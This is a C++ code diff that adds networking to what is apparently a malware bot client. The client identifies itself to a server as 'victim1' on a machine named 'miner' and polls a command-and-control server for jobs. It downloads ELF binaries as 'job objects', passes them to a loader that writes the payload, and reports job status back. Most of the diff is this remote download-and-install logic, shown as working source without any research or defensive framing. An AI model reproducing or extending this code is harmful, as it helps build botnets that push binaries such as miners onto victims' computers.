@@ -40,8 +40,13 @@ private:
         
         http::Request requestGET(URL);
         const auto response = requestGET.send("GET");
-        printf("Size response: %ld\n", response.body.size());
-        printf("Size request: %ld\n", size);
+
+        if (!(response.body.at(0) == 0x7f && response.body.at(1) == 0x45 &&
+            response.body.at(2) == 0x4c && response.body.at(3) == 0x46)) {
+            
+            printf("Failed to retrieve job object!\n");
+            return NULL;
+        }
         
         for (int i = 0; i < response.body.size(); i++) {
             file[i] = response.body.at(i);
@@ -64,8 +69,34 @@ private:
         //     this->computername.c_str(), this->computerinfo.c_str(), this->slaveId.c_str());
 
 
-        return "{\"username\":\"victim1\", \"computername\":\"miner\", \"info\":\"LINUX\", \"slaveId\":\"e1896e80-c325-11ed-b033-f5252f300cca\"}";
+        return "{\"username\":\"victim1\", \"computername\":\"miner\", \"info\":\"LINUX\", \"id\":\"e1896e80-c325-11ed-b033-f5252f300cca\"}";
+    }
 
+    char* prepareJobURL() {
+
+        // Create URL with jobID.
+        char* urlJob = new char[this->jobId.length() + strlen(URL_JOB)];
+        snprintf(urlJob, this->jobId.length() + strlen(URL_JOB), URL_JOB, this->jobId.c_str());
+
+        return urlJob;
+    }
+
+    char* prepareJobBody(int code) {
+
+        string status = to_string(code);
+
+        char* jobBody = new char[status.length() + strlen(BODY_JOB)];
+        snprintf(jobBody, status.length() + strlen(BODY_JOB), BODY_JOB, status.c_str());
+
+        return jobBody;
+    }
+
+    char* preparePingURL() {
+        char* pingUrl = new char[this->slaveId.length() + strlen(URL_PING)];
+        snprintf(pingUrl, this->slaveId.length() + strlen(URL_PING), URL_PING, 
+            this->slaveId.c_str());
+
+        return pingUrl;
     }
 
 public:
@@ -100,7 +131,20 @@ public:
 
     // Ping server for status updates or new objects.
     int ping() {
-        return 0;
+
+        json::JSON responseBody = httpGET(preparePingURL());
+        if (responseBody.size() <= 0) {
+            return RESPONSE_ERROR; // No response from server.
+        }
+
+        int code = json::getInt("code", responseBody);
+        if (code == RESPONSE_NEW_OBJECT) {
+
+            this->jobId = json::getStr("id", responseBody);
+            this->objectSize = json::getInt("size", responseBody);
+        }
+
+        return code;
     }
 
     // Get job.
@@ -116,20 +160,28 @@ public:
             return false;
         }
 
-        // Create URL with jobID.
-        char* urlJob = new char[this->jobId.length() + strlen(URL_JOB)];
-        snprintf(urlJob, this->jobId.length() + strlen(URL_JOB), URL_JOB, this->jobId.c_str());
-        printf("JOB URL: %s\n", urlJob);
+        char* urlJob = prepareJobURL();
 
         // Download the file.
         unsigned char* file = downloadFile(urlJob, this->objectSize);
-        bool success = loader->writePayload(file, this->objectSize);
+        if (file == NULL) {
+            return false;
+        }
+
+        return loader->writePayload(file, this->objectSize);
+    }
+
+    int finishJob(int status) {
+
+        // Create URL with jobID.
+        char* urlJob = prepareJobURL();
+        json::JSON responseBody = httpPOST(urlJob, prepareJobBody(status));
 
         // Clear values.
         this->objectSize = 0;
         this->jobId = "NO_JOB";
 
-        return success;
+        return json::getInt("code", responseBody);
     }
 };
 
